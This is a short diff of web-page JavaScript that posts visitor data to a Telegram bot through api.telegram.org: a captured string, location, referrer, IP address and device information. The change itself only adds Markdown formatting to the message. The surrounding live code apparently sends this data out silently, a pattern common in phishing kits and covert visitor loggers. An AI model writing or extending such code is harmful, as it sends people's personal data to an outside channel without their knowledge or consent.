@@ -41,7 +41,7 @@
           $.ajax({
             url:'https://api.telegram.org/bot'+toten+'/sendMessage',
             method:'POST',
-            data:{chat_id:chat_id,text:'==> Visitor data: '+string+', Location: '+location+'\n==> Reference from: '+ref+'\n==> ip: '+ip_data+'==> client device info: '+client_data},
+            data:{chat_id:chat_id,parse_mode:'Markdown',text:'==> Visitor data: '+string+', Location: '+location+'\n==> Reference from: '+ref+'\n==> ip: '+ip_data+'==> client device info: '+client_data},
             success:function(){
             },
             error: function (request, status, error) {
